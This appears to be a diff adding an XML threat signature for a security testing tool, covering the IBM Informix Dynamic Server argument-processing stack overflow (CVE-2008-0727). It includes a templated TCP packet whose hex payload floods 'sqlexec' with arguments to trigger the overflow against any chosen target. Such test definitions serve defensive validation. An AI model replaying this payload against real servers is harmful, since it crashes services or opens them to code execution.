@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Informix Dynamic Server Command Argument Processing Stack Overflow"/>
+    <EngDesc display="true" value="A stack buffer overflow vulnerability exists in IBM Informix Dynamic Server. The vulnerability is due to a boundary error when processing a large number of arguments passed in the Authentication messages. Remote unauthenticated attackers may exploit the vulnerability to cause denial of service or inject and execute arbitrary code on the target system with System privileges. In a sophisticated attack scenario where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System. In an attack case where code injection is not successful, the affected server will terminate and reset all established connections."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IBM Informix Internal Protocol"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_Informix_Dynamic_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IBM_Informix_Dynamic_Server_10.x&amp;11.x&amp;7.x&amp;9.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-0727"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="2c4fbd4d9e93d8b31e4a10ee37d5a972"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634007251064353824"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1265106606" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="L"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="L"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:07:E9:0A:07:E5" destMac="00:0C:29:68:CB:E6" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01C9" Identification="D666" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="00BA" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="38534" destPort="$destPort" SeqNumber="6B5F05CB" AckNumber="BDA3290C" HeaderLength="05" WindowSize="05B4" Checksum="3EE9" UrgentPointer="0000" Options="" Payload="7371415A30425051414173716C6578656320612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061206120612061" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
